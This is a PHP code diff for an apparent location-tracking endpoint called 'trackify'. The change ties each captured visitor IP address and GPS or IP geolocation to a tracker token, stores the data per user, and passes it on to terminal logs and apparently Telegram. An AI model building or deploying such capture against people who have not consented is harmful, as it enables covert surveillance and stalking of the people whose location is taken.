@@ -13,6 +13,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 }
 
 require_once 'geo.php';
+require_once __DIR__ . '/trackify_capture.php';
 
 // Get client IP
 $ip = $_SERVER['REMOTE_ADDR'] ?? '';
@@ -57,23 +58,22 @@ if (!$geo || !isset($geo['status']) || $geo['status'] !== 'success') {
     exit;
 }
 
-// Save to geolocations.json
+$tid = $_POST['tid'] ?? $_POST['tracker_id'] ?? '';
+$userId = trackify_user_id_for_token($tid);
+if ($userId === null) {
+    echo json_encode(['status' => 'error', 'message' => 'Invalid or missing tracker id']);
+    exit;
+}
+
 $entry = [
+    'user_id' => $userId,
     'ip' => $ip,
     'timestamp' => date('Y-m-d H:i:s'),
-    'geo' => $geo
+    'geo' => $geo,
 ];
 
-$file = 'geolocations.json';
-$data = [];
-if (file_exists($file)) {
-    $content = @file_get_contents($file);
-    if ($content !== false) {
-        $data = json_decode($content, true) ?: [];
-    }
-}
-$data[] = $entry;
-@file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
+trackify_append_geolocation($userId, $entry);
+$captureDir = trackify_user_capture_dir($userId);
 
 // Display location to terminal
 $sourceLabel = ($geo['source'] ?? '') === 'gps' ? 'GPS (Device)' : 'IP Geolocation';
@@ -97,7 +97,7 @@ if (defined('STDERR') && is_resource(STDERR)) {
 }
 error_log(trim($locationDisplay));
 @file_put_contents('location.log', $locationDisplay . "\n", FILE_APPEND | LOCK_EX);
-@file_put_contents('location_notify.txt', $locationDisplay, LOCK_EX);
+@file_put_contents($captureDir . '/location_notify.txt', $locationDisplay, LOCK_EX);
 
 // Send to Telegram
 $telegram_token = '';
